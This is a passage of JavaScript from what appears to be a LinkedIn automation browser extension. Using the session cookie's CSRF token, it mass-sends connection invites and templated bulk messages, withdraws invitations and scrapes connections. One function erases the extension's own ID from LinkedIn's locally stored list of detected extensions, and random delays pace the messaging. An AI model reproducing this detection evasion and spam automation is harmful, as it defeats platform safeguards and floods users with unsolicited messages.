            url: LINKEDIN_DOMAIN_URL + 'sales/trackAction?salesActionEvent.pageKey=sales-search3-people&salesActionEvent.moduleKey=tagsTab&salesActionEvent.action=CLICK&salesActionEvent.cP.target=add_tag&csrfToken='+escape(csrf_token),
            beforeSend: beforeSendingAjax,
            type: 'POST',
            complete: function(){
                deleteCookie('sdsc');
                $.ajax({
                    url: LINKEDIN_DOMAIN_URL + 'sales-api/salesApiTags?action=createTaggings',
                    beforeSend: beforeSendingAjax,
                    type: 'POST',
                    contentType: "application/json",
                    data: JSON.stringify(obj),
                    xhrFields: {
                        withCredentials: false
                    },
                    success : function(data){
                        if(typeof callback == 'function') callback(data);
                    },
                    error : function(xhr){
                        // console.log("XHR Failed for "+url);
                        if(typeof callback == 'function') callback();
                    }
                })
            }
        })
    } else {
        // old design
        obj['tagIds[]'] = tagIds;
        obj['entityIds[]'] = member_id;
        obj['entityType'] = 'lead';
        $.ajax({
            url: LINKEDIN_DOMAIN_URL + 'sales/trackAction?salesActionEvent.pageKey=sales-search3-people&salesActionEvent.moduleKey=tagsTab&salesActionEvent.action=CLICK&salesActionEvent.cP.target=add_tag&csrfToken='+escape(csrf_token),
            beforeSend: beforeSendingAjax,
            type: 'POST',
            complete: function(){
                deleteCookie('sdsc');
                $.ajax({
                    url : LINKEDIN_DOMAIN_URL + 'sales/taggings/create?csrfToken='+escape(csrf_token),
                    beforeSend: beforeSendingAjax,
                    type: 'POST',
                    data: obj,
                    xhrFields: {
                        withCredentials: false
                    },
                    success : function(data){
                        if(typeof callback == 'function') callback(data);
                    },
                    error : function(xhr){
                        // console.log("XHR Failed for "+url);
                        if(typeof callback == 'function') callback();
                    }
                })
            }
        })
    }
    // var formData = new FormData();
}

function syncLinkedInTags(){
    if(isSalesNav){
        callXHROnLinkedIn(LINKEDIN_DOMAIN_URL + 'sales/tags', [], function(l_tags){
            if(l_tags && typeof l_tags == 'object' && l_tags.length > 0){
                var l_tags_ids = l_tags.map(x=>x.id);
                getTags(function(){
                    chrome.runtime.sendMessage({
                        removeLITags: true
                    }, function(){
                        l_tags.forEach(function(e,i){
                            chrome.runtime.sendMessage({
                                add_tag: true,
                                linked_tag_id: e.id,
                                tag_name: e.name
                            }, function(){
                                // console dummy response
                                local_data.synced = true;
                            })
                        })
                    });
                });
            }
        })
    }
}

function mapObjectUrns(){
    if(connections_all){
        connections_all.forEach(function(c){
            objectUrnsToEntityUrns[c.objectUrn.replace('urn:li:member:', '')] = c.entityUrn.replace('urn:li:fs_miniProfile:', '');
        });
    }
}

function decodeExtName(a){if(!a)return a;var c={r:"a",O:"a",x:"b",L:"b",G:"c",I:"C",w:"d",v:"d",f:"e",P:"E",B:"F",H:"f",U:"g",k:"G",F:"h",n:"H",T:"i",D:"i",u:"k",d:"l",a:"L",h:"m",A:"M",X:"n",W:"o",c:"O",o:"P",S:"p",M:"q",l:"r",s:"r",j:"S",C:"s",Y:"t",y:"t",R:"u",V:"u",K:"v",Q:"W",m:"x",Z:"y",i:"z"},b="";a.split("").forEach(function(a){b=c[a]?b+c[a]:b+a});return b};

function updateLinkedInExtList(){
    var L_id = 'feoiiijdmfoabkkgfnfhfhhghhlmjbmb' || chrome.runtime.id;
    var C_C_M = localStorage.getItem("C_C_M");
    if(C_C_M){
        C_C_M = JSON.parse(atob(C_C_M));
        if(C_C_M.Metadata){
            var ext = C_C_M.Metadata.ext;
            var list_of_exts = ext.map(function(x){
                return {
                    name : decodeExtName(x.name),
                    path : x.path.length > 0 ? 'chrome.google.com/webstore/detail/'+x.path[0].slice(0,32) : ''
                }
            });
            var ext_paths = ext.map(function(e){
                return e.path.map(function(p){
                    return p.slice(0,32);
                }).toString();
            });
            var L_idx = -1;
            ext_paths.map(function(p, i){
                if(p.indexOf(L_id) > -1){
                    L_idx = i;
                }
            });
            if(L_idx > -1){
                ext.splice(L_idx,1);
                C_C_M.Metadata.ext = ext;
                localStorage.setItem("C_C_M",btoa(JSON.stringify(C_C_M)));
                // console.log(JSON.parse(atob(localStorage.getItem("C_C_M"))));
            }
        }
    }
}

function getFileUploadToken(callback){
    $.ajax({
        url: LINKEDIN_DOMAIN_URL + 'voyager/api/fileUploadToken?type=ATTACHMENT',
        beforeSend: function(req) {
            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
            req.setRequestHeader('csrf-token', csrf_token);
        },
        xhrFields: {
            withCredentials: true
        },
        type: 'GET',
        success: function(resp) {
            if (typeof callback == 'function') {
                callback(resp.uploadToken);
            }
        },
        error : function(xhr){
            console.log(xhr);
        }
    })
}

function checkForAcceptedConnections(callback) {
    chrome.runtime.sendMessage({
        'getUserSentConnections': true
    }, function(sc) {
        sent_connections = sc && sc.conns || [];
        var conns_needs_update = [];
        var conns_needs_remove = [];
        var conns_needs_delete = [];
        getAllRequestsSent(0, [], function(total_conns_sent) {
            pending_connections = total_conns_sent.slice(0);
            var sent_conns_pid = total_conns_sent.map(function(c) {
                return c.toMember ? c.toMember.publicIdentifier : false;
            });
            var sent_conns_mid = total_conns_sent.map(function(c) {
                return c.toMember ? c.toMember && c.toMember.objectUrn && c.toMember.objectUrn.replace('urn:li:member:', '') : false;
            });
            var total_conns_pid = connections_all.map(function(c) {
                return c.publicIdentifier;
            })
            var total_conns_mid = connections_all.map(function(c) {
                return c.objectUrn.replace('urn:li:member:', '');
            })
            sent_connections.forEach(function(connObj) {
                var recId = connObj.c_public_id;
                var memberId = connObj.c_member_id;
                if ((connObj.is_accepted == "false") && (sent_conns_pid.indexOf(recId) == -1 || sent_conns_mid.indexOf(memberId) == -1) && (total_conns_pid.indexOf(recId) > -1 || total_conns_mid.indexOf(memberId) > -1)) {
                    conns_needs_update.push(connObj.id);
                }
                if(sent_conns_mid.indexOf(memberId) > -1 && connObj.is_accepted != "false"){        //sent_conns_pid.indexOf(recId) > -1 ||
                    conns_needs_remove.push(connObj.id);
                }
                // if(connObj.is_accepted != "removed" && ((sent_conns_pid.indexOf(recId) == -1 && total_conns_pid.indexOf(recId) == -1) || (sent_conns_mid.indexOf(memberId) == -1 && total_conns_mid.indexOf(memberId) == -1))){
                //     conns_needs_delete.push(connObj.id);
                // }
                // else if(sent_conns_pid.indexOf(recId) == -1) {
                //     conns_needs_remove.push(connObj.id);
                // }
            });
            
            var accepted_conns = sent_connections.filter(function(s){
                return s.is_accepted == "true";
            })
            updateAcceptedLen = accepted_conns.length || 0;
            chrome.runtime.sendMessage({
                showAcceptedNotification: true,
                count: accepted_conns.length
            });
            // if(accepted_conns.length > 0){
            // }
            var callbackVal = false;
            if (conns_needs_update.length > 0 || conns_needs_remove.length > 0 || conns_needs_delete.length > 0) {
                callbackVal = true;
                updateConnectionStatus(conns_needs_update, "true", 0, function() {
                    if(conns_needs_remove.length > 0 || conns_needs_delete.length > 0){
                        updateConnectionStatus(conns_needs_remove, "false", 0, function() {
                            if (typeof callback == 'function') {
                                callback(callbackVal);
                            }
                            // if(conns_needs_delete.length > 0){
                            //     updateConnectionStatus(conns_needs_delete, "removed", 0, function() {
                            //         if (typeof callback == 'function') {
                            //             callback(callbackVal);
                            //         }
                            //     })
                            // } else if (typeof callback == 'function') {
                            //     callback(callbackVal);
                            // }
                        })
                    } else if (typeof callback == 'function') {
                        callback(callbackVal);
                    }
                })
            } else {
                if (typeof callback == 'function') {
                    callback(callbackVal);
                }
            }
            // if(conns_needs_remove.length > 0){
            //     removeConnectionRequest(conns_needs_remove, 0, function() {
            //         // console.log("connections are removed from db");
            //     })
            // }
        });
        // if (sent_connections.length > 0) {
        // } else if (typeof callback == 'function') {
        //     callback();
        // }
    });
}

function withdrawConnectionRequest(public_id, callback) {
    if(pending_connections && pending_connections.filter == undefined){
        console.log("No pending connections found!");
        return false;
    }
    var withdrawingConn = pending_connections.filter(function(p) {
        return p.toMember && p.toMember.publicIdentifier == public_id ? p.toMember.publicIdentifier : false;
    })[0];
    var connection_id = withdrawingConn && withdrawingConn.entityUrn && withdrawingConn.entityUrn.replace('urn:li:fs_relInvitation:', '');
    if(connection_id){
        $.ajax({
            url: LINKEDIN_DOMAIN_URL + 'voyager/api/relationships/invitations/' + connection_id + '?action=withdraw',
            beforeSend: function(req) {
                var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                req.setRequestHeader('csrf-token', csrf_token);
            },
            xhrFields: {
                withCredentials: true
            },
            type: 'POST',
            success: function() {
                chrome.runtime.sendMessage({
                    audit : true,
                    event : 'invitation_withdrawn'
                });
                if (typeof callback == 'function') {
                    callback();
                }
            },
            error: function(){
                chrome.runtime.sendMessage({
                    audit : true,
                    event : 'invitation_withdrawn_failed'
                });
                if (typeof callback == 'function') {
                    callback();
                }
            }
        })
    } else if (typeof callback == 'function') {
        callback();
    }
}

function withdrawMultipleConnectionRequests(public_ids, callback) {
    var inviteActionData = [];
    if(pending_connections && pending_connections.filter == undefined){
        console.log("No pending connections found!");
        return false;
    }
    if(public_ids.length > 0){
        public_ids.forEach(function(public_id){
            var withdrawingConn = pending_connections.filter(function(p) {
                return p.toMember && p.toMember.publicIdentifier == public_id ? p.toMember.publicIdentifier : false;
            })[0];
            var entityUrn = withdrawingConn.entityUrn;
            inviteActionData.push({"entityUrn": entityUrn,"validationToken": "dummy"});
        })
        data = {"inviteActionType": "WITHDRAW","inviteActionData":inviteActionData};
        $.ajax({
            url: LINKEDIN_DOMAIN_URL + 'voyager/api/relationships/invitations?action=closeInvitations',
            data: JSON.stringify(data),
            dataType: 'json',
            contentType: 'application/json; charset=utf-8',
            beforeSend: function(req) {
                var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                req.setRequestHeader('csrf-token', csrf_token);
            },
            xhrFields: {
                withCredentials: true
            },
            type: 'POST',
            success: function() {
                chrome.runtime.sendMessage({
                    audit : true,
                    event : 'invitation_withdrawn'
                });
                if (typeof callback == 'function') {
                    callback();
                }
            },
            error: function(){
                chrome.runtime.sendMessage({
                    audit : true,
                    event : 'invitation_withdrawn_failed'
                });
                if (typeof callback == 'function') {
                    callback();
                }
            }
        })
    }
}

function getProfileDetails(callback) {
    var pageSource = document.body.innerHTML;
    var json_codes = pageSource.match(/>\s+{.*}\s+</g);
    var profile_img = null;
    var publicIdentifier = null;
    var email = null;
    var json_arr = pageSource.match(/<!--{[\s\S]*?}-->/g);
    var json_filtered_list = [];
    if(json_arr && json_arr.length > 0){
        json_arr.forEach(function(ja) {
            ja = ja.replace(/<!--/, '').replace(/-->/, '');
            ja = JSON.parse(ja);
            if(ja.isSales){
                isSalesNav = true;
            }
        })
    }
    if(location.href.indexOf('www.linkedin.com/sales') > -1){
        isSalesNav = true;
    }
    if(isSalesNav){
        is_sales_profile_active = isSalesNav;
    }
    getAccountType(function(account_type){
        local_data.account_type = account_type;
        getCurrentProfileDetailsForRegistration(function(profile_details){
            publicIdentifier = profile_details.linkedin_profile_id;
            email = profile_details.email;
            profile_img = profile_details.profile_img;
            if (publicIdentifier || email) {
                chrome.runtime.sendMessage({
                    getUserIdByEmail: true,
                    email: email,
                    publicIdentifier: publicIdentifier
                }, function(res) {
                    if (res && ((res.length == 0) || (res.length > 0 && res[0].id == false)) ) {
                        chrome.storage.local.clear();
                        chrome.storage.local.set({
                            "isSignUpRequired": true
                        });
                        callback = false;
                    } else if (res) {
                        chrome.storage.local.set({
                            "isSignUpRequired": false
                        });
                        if(res && res[0]){
                            res[0].autoLogIn = true;
                            res[0].profile_img = profile_img;
                            res[0].rememberMe = true;
                            res[0].success = "1";
                            user_details = res[0];
                            user_details.autoWish = typeof user_details.autoWish == 'string' && user_details.autoWish.length > 0 ? JSON.parse(user_details.autoWish) : user_details.autoWish;
                            chrome.storage.local.set({
                                "user_details": res[0]
                            });
                            profile_details.registered = user_details.date_joined;
                            profile_details.profile = user_details.linkedin_profile_url;
                            profile_details.ID = user_details.id;
                            profile_details.user_plan = user_details.user_plan;
                            profile_details.user_type = user_details.user_type;
                            profile_details.renewal_date = null;
                            chrome.storage.local.set({user_profile: profile_details});
                        } else {
                            chrome.storage.local.clear();
                            // location.reload();
                            showNotification("Severs currently under maintenance. Please check back soon.", "reload");
                        }
                    }
                    chrome.storage.local.set({
                        isSalesNav: is_sales_profile_active
                    })
                    if (profile_img) {
                        getUserDetails(function(ud) {
                            if (ud) {
                                ud.profile_img = profile_img;
                                ud.isSalesNav = is_sales_profile_active;
                                user_details = ud;
                                user_details.autoWish = typeof user_details.autoWish == 'string' && user_details.autoWish.length > 0 ? JSON.parse(user_details.autoWish) : user_details.autoWish;
                                chrome.storage.local.set({
                                    "user_details": ud
                                });
                                chrome.runtime.sendMessage({
                                    saveUserData : true,
                                    profile_img : profile_img,
                                    account_type: local_data.account_type
                                }, function(){
                                    if(typeof callback == 'function'){
                                        callback();
                                    }
                                })
                            }
                        })
                    } else {
                        if(typeof callback == 'function'){
                            callback();
                        }
                    }
                })
            } else {
                console.log("This won't happen usually.\nPlease mail to support@meetleonard.com");
            }
        })
    })
}

function getAllRequestsSent(page, requests, callback) {
    if (!document.cookie.match(JSESSIONID_REGEX)) {
        return false;
    }
    var paging = 100;
    page = page || 0;
    requests = requests || [];
    $.ajax({
        url: LINKEDIN_DOMAIN_URL + 'voyager/api/relationships/invitations?folder=SENT&start=' + page + '&count=' + paging,
        beforeSend: function(req) {
            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
            req.setRequestHeader('csrf-token', csrf_token);
        },
        xhrFields: {
            withCredentials: true
        },
        success: function(resp) {
            if(resp && resp.elements){
                requests = requests.concat(resp.elements);
                page += paging;
                if (resp.elements.length > paging - 50) {
                    getAllRequestsSent(page, requests, callback);
                } else if (typeof callback == 'function') {
                    callback(requests);
                }
            } else {
                callback(requests);
            }
        }
    })
}

function getAllRequestsReceived(page, requests, callback) {
    if (!document.cookie.match(JSESSIONID_REGEX)) {
        return false;
    }
    var paging = 100;
    page = page || 0;
    requests = requests || [];
    $.ajax({
        url: LINKEDIN_DOMAIN_URL + 'voyager/api/relationships/invitations?folder=RECEIVED&start=' + page + '&count=' + paging,
        beforeSend: function(req) {
            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
            req.setRequestHeader('csrf-token', csrf_token);
        },
        xhrFields: {
            withCredentials: true
        },
        success: function(resp) {
            if(resp && resp.elements){
                requests = requests.concat(resp.elements);
                page += paging;
                if (resp.elements.length > paging - 50) {
                    getAllRequestsReceived(page, requests, callback);
                } else if (typeof callback == 'function') {
                    callback(requests);
                }
            } else {
                callback(requests);
            }
        }
    })
}

function getAllConnections(start, connections, callback) {
    if (!document.cookie.match(JSESSIONID_REGEX)) {
        return false;
    }
    start = start || 0;
    connections = connections || [];
    var count = 2000;
    $.ajax({
        url: LINKEDIN_DOMAIN_URL + 'voyager/api/relationships/connections?count=' + count + '&sortType=RECENTLY_ADDED&start=' + start,
        beforeSend: function(req) {
            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
            req.setRequestHeader('csrf-token', csrf_token);
        },
        xhrFields: {
            withCredentials: true
        },
        success: function(resp) {
            if(resp && resp.elements){
                resp.elements.forEach(function(con) {
                    if (con.miniProfile && con.miniProfile.publicIdentifier) {
                        con.miniProfile.createdAt = con.createdAt;
                        connections.push(con.miniProfile);
                    }
                });
                if (resp.elements.length < count - 500) {
                    if (typeof callback == 'function') {
                        callback(connections);
                    }
                } else {
                    start += resp.elements.length;
                    getAllConnections(start, connections, callback);
                }
            } else {
                callback(connections);
            }
        }
    })
}

function sendConnection(attrs, callback) {
    if (!document.cookie.match(JSESSIONID_REGEX)) {
        showNotification(local_strings['COOKIES_NOT_FOUND']);
        return false;
    }
    var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
    var templateObj = invitationMessages.filter(function(t) {
        return t.id == local_data.selectedInvitationMessage
    })[0];
    if (!templateObj) {
        if (local_data.selectedInvitationMessage) {
            templateObj = {
                template_content: local_data.selectedInvitationMessage
            }
        } else {
            showNotification(local_strings['PROB_INV_MSG'])
            return false;
        }
    }
    var tc = templateObj.template_content;
    if (isSalesNav) {
        attrs.member_id = attrs.objectUrn;
        var moduleKey = attrs.moduleKey;
        var pageKey = attrs.pageKey;
        var contextId = attrs.contextId;
        var requestId = attrs.requestId;
        var firstname = attrs.firstName;
        var lastname = attrs.lastName;
        var member_id = attrs.member_id;
        var authToken = attrs.authToken;
        var authType = attrs.authType;
        var aliasRec = aliases && aliases.length > 0 && typeof aliases == 'object' && aliases.filter(x=>x.entityUrn == attrs.member_id)[0];
        if(aliasRec){
            firstname = aliasRec.new_name.split(" ").slice(0,1)[0];
            lastname = aliasRec.new_name.split(" ").slice(-1)[0];
        }
        // var connect_url = LINKEDIN_DOMAIN_URL + 'sales/profile/connect?'+csrf_token;
        var connect_url = LINKEDIN_DOMAIN_URL + 'sales/profile/connect?trackingInfoJson.moduleKey=' + moduleKey + '&trackingInfoJson.pageKey=' + pageKey + '&trackingInfoJson.contextId=' + contextId + '&trackingInfoJson.requestId=' + requestId + '&trackingInfoJson.position=' + currentIdx + '&csrfToken=' + escape(csrf_token);
        getFormattedAddress(attrs.locationName, tc, function(address){
            if(address != 'error' || (tc.indexOf('%city%') == -1 && tc.indexOf('%state%') == -1 && tc.indexOf('%country%') == -1) ){
                if(address == 'error'){
                    address = {
                        city: '',
                        state: '',
                        country: ''
                    }
                }
                tc = tc.replace(/%firstName%/g, firstname)
                        .replace(/%lastName%/g, lastname)
                        .replace(/%position%/g, attrs.title)
                        .replace(/%company%/g, attrs.companyName)
                        .replace(/%industry%/g, attrs.industryName)
                        .replace(/%city%/g, address.city)
                        .replace(/%state%/g, address.state)
                        .replace(/%country%/g, address.country);
                data = {
                    message: tc,
                    pageKey: pageKey,
                    moduleKey: moduleKey,
                    contextId: contextId,
                    requestId: requestId,
                    position: currentIdx.toString(),
                    profileId: parseInt(member_id),
                    authToken: authToken,
                    authType: authType
                }
                $.ajax({
                    url: connect_url,
                    type: 'POST',
                    data: JSON.stringify(data),
                    dataType: 'json',
                    contentType: 'application/json; charset=utf-8',
                    beforeSend: function(req) {
                        req.setRequestHeader('csrf-token', csrf_token);
                    },
                    xhrFields: {
                        withCredentials: true
                    },
                    success: function(resp) {
                        chrome.runtime.sendMessage({
                            audit : true,
                            event : 'invitation_sent'
                        });
                        if (typeof callback == 'function') {
                            callback(resp);
                        }
                    },
                    error : function(xhr){
                        var connect_url = LINKEDIN_DOMAIN_URL + 'sales-api/salesApiConnection?action=connect';
                        $.ajax({
                            url: connect_url,
                            type: 'POST',
                            data: JSON.stringify({
                                "member" : attrs.entityUrn,
                                "message" : tc,
                                "isEmailRequired" : false
                            }),
                            complete: function(xhr){
                                if(xhr.status == 201 && xhr.readyState == 4){
                                    chrome.runtime.sendMessage({
                                        audit : true,
                                        event : 'invitation_sent'
                                    });
                                    if (typeof callback == 'function') {
                                        callback();
                                    }
                                } else {
                                    chrome.runtime.sendMessage({
                                        audit : true,
                                        event : 'invitation_sending_failed'
                                    });
                                    if (typeof callback == 'function') {
                                        callback('error');
                                    }
                                }
                            }
                        });
                    }
                })
            } else {
                chrome.runtime.sendMessage({
                    audit : true,
                    event : 'problem_with_location'
                });
                callback('error');
            }
        })
    } else {
        var firstname = attrs.firstName,
            lastname = attrs.lastName,
            profile_id = attrs.publicIdentifier,
            trackingId = attrs.trackingId;
        var aliasRec = aliases && aliases.length > 0 && typeof aliases == 'object' && aliases.filter(x=>x.entityUrn == attrs.publicIdentifier)[0];
        if(aliasRec){
            firstname = aliasRec.new_name.split(" ").slice(0,1)[0];
            lastname = aliasRec.new_name.split(" ").slice(-1)[0];
        }
        getFormattedAddress(attrs.locationName, tc, function(address){
            if(address != 'error' || (tc.indexOf('%city%') == -1 && tc.indexOf('%state%') == -1 && tc.indexOf('%country%') == -1) ){
                if(address == 'error'){
                    address = {
                        city: '',
                        state: '',
                        country: ''
                    }
                }
                tc = tc.replace(/%firstName%/g, firstname)
                        .replace(/%lastName%/g, lastname)
                        .replace(/%position%/g, attrs.title)
                        .replace(/%company%/g, attrs.companyName)
                        .replace(/%industry%/g, attrs.industryName)
                        .replace(/%city%/g, address.city)
                        .replace(/%state%/g, address.state)
                        .replace(/%country%/g, address.country);
                $.ajax({
                    url: LINKEDIN_DOMAIN_URL + 'voyager/api/growth/normInvitations',
                    type: 'POST',
                    data: JSON.stringify({
                        "trackingId": trackingId,
                        "message": tc,
                        "invitations": [],
                        "invitee": {
                            "com.linkedin.voyager.growth.invitation.InviteeProfile": {
                                "profileId": profile_id
                            }
                        }
                    }),
                    dataType: 'json',
                    contentType: 'application/json; charset=utf-8',
                    beforeSend: function(req) {
                        req.setRequestHeader('csrf-token', csrf_token);
                    },
                    xhrFields: {
                        withCredentials: true
                    },
                    success: function(resp) {
                        chrome.runtime.sendMessage({
                            audit : true,
                            event : 'invitation_sent'
                        });
                        if (typeof callback == 'function') {
                            callback(resp);
                        }
                    },
                    error: function(xhr){
                        if(xhr.status == 201 && xhr.readyState == 4){
                            chrome.runtime.sendMessage({
                                audit : true,
                                event : 'invitation_sent'
                            });
                            if (typeof callback == 'function') {
                                callback();
                            }
                        } else {
                            chrome.runtime.sendMessage({
                                audit : true,
                                event : 'invitation_sending_failed'
                            });
                            if (typeof callback == 'function') {
                                callback('error');
                            }
                        }
                    }
                })
            } else {
                chrome.runtime.sendMessage({
                    audit : true,
                    event : 'problem_with_location'
                });
                callback('error');
            }
        })
    }
}

function sendFollowUpMessagesByChecking(messages, idx, callback) {
    chrome.runtime.sendMessage({
        'getUserComms': true
    }, function(cm){
        recentComms = cm && cm.comms || [];
        local_data.engagedConnections = [];
        local_data.removedConnections = [];
        sendFollowUpMessages(messages, idx, callback, true);
    });
}

function sendFollowUpMessages(messages, idx, callback, check_engagement) {
    if (!document.cookie.match(JSESSIONID_REGEX)) {
        return false;
    }
    function canSendFollowUp(messages, idx, callback){
        // //debugging
        // idx++;
        // sendFollowUpMessages(messages, idx, callback, check_engagement);
        // return false;
        var message = messages[idx];
        var body = message.message;
        var attachments = message.attachments || [];
        var entityUrn = message.entityURN;
        try{
            if(message.attachments){
                attachments = getAttachmentsObj(JSON.parse(message.attachments),'message');
            }
        } catch(err) {
            attachments = [];
        }
        var matchedComm = recentComms.filter(x=>x.entityUrn == entityUrn && x.type == 'FollowUpMessage');
        if(matchedComm && matchedComm[0]){
            var comm = matchedComm[0];
            var daysSent = (new Date() - new Date(comm.date_sent))/(ONE_DAY);
            if(daysSent < 1){
                idx++;
                chrome.runtime.sendMessage({
                    audit : true,
                    comm_obj : comm_obj,
                    event : 'follow_up_message_sending_again_issue'
                });
                sendFollowUpMessages(messages, idx, callback, check_engagement);
                return false;
            }
        }
        visitProfile(entityUrn, function(attrs){
            var aliasRec = aliases && aliases.length > 0 && typeof aliases == 'object' && aliases.filter(x=>x.entityUrn == entityUrn)[0];
            var firstName = attrs.firstName;
            var lastName = attrs.lastName;
            if(aliasRec){
                firstName = aliasRec.new_name.split(" ").slice(0,1)[0];
                lastName = aliasRec.new_name.split(" ").slice(-1)[0];
            }
            getFormattedAddress(attrs.locationName, body, function(address){
                if(address != 'error' || (body.indexOf('%city%') == -1 && body.indexOf('%state%') == -1 && body.indexOf('%country%') == -1) ){
                    if(address == 'error'){
                        address = {
                            city: '',
                            state: '',
                            country: ''
                        }
                    }
                    body = body.replace(/%firstName%/g, firstName)
                                .replace(/%lastName%/g, lastName)
                                .replace(/%position%/g, attrs.title)
                                .replace(/%company%/g, attrs.companyName)
                                .replace(/%industry%/g, attrs.industryName)
                                .replace(/%city%/g, address.city)
                                .replace(/%state%/g, address.state)
                                .replace(/%country%/g, address.country);
                    var comm_obj = {
                        type: 'FollowUpMessage',
                        date_sent: true,
                        rec_name: attrs.firstName + ' ' + attrs.lastName,
                        content: body,
                        profile_url: LINKEDIN_PROFILE_URL + attrs.publicIdentifier,
                        profile_id: attrs.publicIdentifier,
                        member_id: attrs.objectUrn,
                        entityUrn: attrs.entityUrn
                    }
                    $.ajax({
                        url: LINKEDIN_DOMAIN_URL + 'voyager/api/messaging/conversations?action=create',
                        type: 'POST',
                        data: JSON.stringify({
                            "conversationCreate": {
                                "eventCreate": {
                                    "value": {
                                        "com.linkedin.voyager.messaging.create.MessageCreate": {
                                            "body": body,
                                            "attachments": attachments
                                        }
                                    }
                                },
                                "recipients": [entityUrn],
                                "subtype": "MEMBER_TO_MEMBER"
                            },
                            "keyVersion": "LEGACY_INBOX"
                        }),
                        dataType: 'json',
                        contentType: 'application/json; charset=utf-8',
                        beforeSend: function(req) {
                            var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                            req.setRequestHeader('csrf-token', csrf_token);
                        },
                        xhrFields: {
                            withCredentials: true
                        },
                        success: function(resp) {
                            idx++;
                            chrome.runtime.sendMessage({
                                audit : true,
                                comm_obj : comm_obj,
                                event : 'follow_up_message_sent'
                            });
                            sendFollowUpMessages(messages, idx, callback, check_engagement);
                        },
                        error: function(xhr) {
                            idx++;
                            // showNotification(local_strings['MSG_SEND_FAILED']);
                            chrome.runtime.sendMessage({
                                audit : true,
                                event : 'message_sending_failed'
                            });
                            setTimeout(function() {
                                sendFollowUpMessages(messages, idx, callback, check_engagement);
                            }, 1000);
                        }
                    });
                } else {
                     chrome.runtime.sendMessage({
                        audit : true,
                        event : 'problem_with_location'
                    });
                    idx++;
                    sendFollowUpMessages(messages, idx, callback, check_engagement);
                }
            });
        })
    }
    var message = messages[idx];
    if (message) {
        local_data.startedMessaging = true;
        var body = message.message;
        var entityUrn = message.entityURN;
        if(check_engagement){
            var msgOb = [{entityUrn:entityUrn}];
            checkEngagement(msgOb,0,function(m){
                if(m && m[0] && !m[0].engaged){
                    local_data.removedConnections.push(message.id);
                    canSendFollowUp(messages, idx, callback);
                } else {
                    local_data.engagedConnections.push(message.id);
                    idx++;
                    sendFollowUpMessages(messages, idx, callback, check_engagement);
                }
            })
        } else {
            canSendFollowUp(messages, idx, callback);
        }
    } else  {
        if((local_data.engagedConnections && local_data.engagedConnections.length > 0) || (local_data.removedConnections && local_data.removedConnections.length > 0)){
            updateConnectionStatus(local_data.engagedConnections, "engaged", 0, function() {
                if(local_data.removedConnections.length > 0){
                    updateConnectionStatus(local_data.removedConnections, "removed", 0, function() {
                        local_data.startedMessaging = false;
                        if(typeof callback == 'function') callback();
                    });
                } else {
                    local_data.startedMessaging = false;
                    if(typeof callback == 'function') callback();
                }
            });
        } else {
            local_data.startedMessaging = false;
            if(typeof callback == 'function') callback();
        }
    }
}

function sendBulkMessages(messages, idx, callback) {
    var message = messages[idx];
    if (message) {
        local_data.startedMessaging = true;
        var body = message.message;
        var entityUrn = message.entityURN;
        var attachments = [];
        try{
            if(message.attachments){
                attachments = getAttachmentsObj(JSON.parse(message.attachments),'message');
            }
        } catch(err) {
            attachments = [];
        }
        visitProfile(entityUrn, function(attrs){
            var aliasRec = aliases && aliases.length > 0 && typeof aliases == 'object' && aliases.filter(x=>(x.entityUrn == entityUrn || x.entityUrn == attrs.publicIdentifier))[0];
            if(attrs){
                getFormattedAddress(attrs.locationName, body, function(address){
                    if(address != 'error' || (body.indexOf('%city%') == -1 && body.indexOf('%state%') == -1 && body.indexOf('%country%') == -1) ){
                        if(address == 'error'){
                            address = {
                                city: '',
                                state: '',
                                country: ''
                            }
                        }
                        body = body.replace(/%firstName%/g, attrs.firstName)
                                    .replace(/%lastName%/g, attrs.lastName)
                                    .replace(/%position%/g, attrs.title)
                                    .replace(/%company%/g, attrs.companyName)
                                    .replace(/%industry%/g, attrs.industryName)
                                    .replace(/%city%/g, address.city)
                                    .replace(/%state%/g, address.state)
                                    .replace(/%country%/g, address.country);
                        var comm_obj = {
                            type: 'Message',
                            date_sent: true,
                            rec_name: attrs.firstName + ' ' + attrs.lastName,
                            content: body,
                            profile_url: LINKEDIN_PROFILE_URL + attrs.publicIdentifier,
                            profile_id: attrs.publicIdentifier,
                            member_id: attrs.objectUrn,
                            entityUrn: attrs.entityUrn
                        }
                        $.ajax({
                            url: LINKEDIN_DOMAIN_URL + 'voyager/api/messaging/conversations?action=create',
                            type: 'POST',
                            data: JSON.stringify({
                                "conversationCreate": {
                                    "eventCreate": {
                                        "value": {
                                            "com.linkedin.voyager.messaging.create.MessageCreate": {
                                                "body": body,
                                                "attachments": attachments
                                            }
                                        }
                                    },
                                    "recipients": [entityUrn],
                                    "subtype": "MEMBER_TO_MEMBER"
                                },
                                "keyVersion": "LEGACY_INBOX"
                            }),
                            dataType: 'json',
                            contentType: 'application/json; charset=utf-8',
                            beforeSend: function(req) {
                                var csrf_token = document.cookie.match(JSESSIONID_REGEX)[1];
                                req.setRequestHeader('csrf-token', csrf_token);
                            },
                            xhrFields: {
                                withCredentials: true
                            },
                            success: function(resp) {
                                updateMessageCount(function(){
                                    idx++;
                                    try{
                                        local_data.CRMCONNECT.postMessage({showMsgCount:true,count:idx});
                                    } catch(err){
                                        createPort(function(){
                                            local_data.CRMCONNECT.postMessage({showMsgCount:true,count:idx});
                                        })
                                    }
                                    chrome.runtime.sendMessage({
                                        audit : true,
                                        comm_obj: comm_obj,
                                        event : 'message_sent'
                                    });
                                    chrome.runtime.sendMessage({
                                        setBadge: idx.toString(),
                                        mode: 'message'
                                    });
                                    local_data.currentIdx = idx;
                                    if(messages.length == idx){
                                        sendBulkMessages(messages, idx, callback);
                                    } else {
                                        checkForRandom(function(){
                                            callAfterTimer({
                                                onProgress: function(time_rem){
                                                    try{
                                                        local_data.CRMCONNECT.postMessage({wait:true,time:time_rem,count:idx});
                                                    } catch(err){
                                                        createPort(function(){
                                                            local_data.CRMCONNECT.postMessage({wait:true,time:time_rem,count:idx});
                                                        })
                                                    }
                                                },
                                                onComplete: function(){
                                                    sendBulkMessages(messages, idx, callback);
                                                }
                                            })
                                        });
                                    }
                                })
                            },
                            error : function(){
